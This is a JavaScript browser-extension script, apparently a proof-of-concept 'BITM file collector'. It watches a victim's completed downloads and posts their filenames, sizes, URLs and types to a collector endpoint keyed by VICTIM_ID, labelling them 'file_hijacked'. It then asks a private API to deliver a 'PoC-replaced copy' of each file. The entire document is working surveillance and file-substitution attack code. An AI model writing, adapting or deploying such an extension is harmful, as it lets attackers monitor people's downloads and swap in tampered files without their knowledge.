const COLLECTOR_URL = 'http://127.0.0.1:8080/VICTIM_ID';
const completedDownloads = new Set();
const browserAPI = typeof browser !== 'undefined' ? browser : chrome;

function getFileName(fullPath) {
  return String(fullPath || '').split(/[/\\]/).pop();
}

function getFileSize(download) {
  if (Number.isInteger(download.fileSize) && download.fileSize >= 0) {
    return download.fileSize;
  }
  if (Number.isInteger(download.totalBytes) && download.totalBytes >= 0) {
    return download.totalBytes;
  }
  return 0;
}

async function postJson(path, payload) {
  let lastError;
  for (let attempt = 1; attempt <= 3; attempt += 1) {
    try {
      const response = await fetch(`${COLLECTOR_URL}${path}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      if (response.ok) return;
      lastError = new Error(`HTTP ${response.status}`);
    } catch (error) {
      lastError = error;
    }
    await new Promise(resolve => setTimeout(resolve, attempt * 1000));
  }
  throw lastError;
}

async function registerCompletedDownload(download) {
  const filename = getFileName(download.filename);
  if (!filename) throw new Error('The completed download has no filename');

  const size = getFileSize(download);
  const timestamp = download.endTime || new Date().toISOString();

  await postJson('/data', {
    data_type: 'file_hijacked',
    file_path: `files_hijacked/${filename}`,
    file_size_bytes: size,
    extra_metadata: {
      source_url: download.url || null,
      final_url: download.finalUrl || null,
      mime: download.mime || null,
      download_id: download.id
    }
  });

  await postJson('/events', {
    event_type: 'file_downloaded',
    timestamp,
    url: download.finalUrl || download.url || null,
    title: 'File downloaded',
    description: filename,
    payload: {
      filename,
      file_path: `files_hijacked/${filename}`,
      file_size_bytes: size,
      mime: download.mime || null
    }
  });

  // Ask the private API to deliver the PoC-replaced copy once.
  await postJson(`/downloads/${encodeURIComponent(filename)}/deliver`, {});

  console.log(`✅ Download collected: ${filename} (${size} bytes)`);
}

browserAPI.downloads.onChanged.addListener(async delta => {
  if (delta.state?.current !== 'complete' || completedDownloads.has(delta.id)) {
    return;
  }

  completedDownloads.add(delta.id);
  try {
    const matches = await browserAPI.downloads.search({ id: delta.id });
    if (!matches.length) throw new Error(`Download ${delta.id} not found`);
    await registerCompletedDownload(matches[0]);
  } catch (error) {
    completedDownloads.delete(delta.id);
    console.error(`❌ Failed to collect download ${delta.id}:`, error);
  }
});

console.log('🟢 BITM file collector 2.0.0 ready');
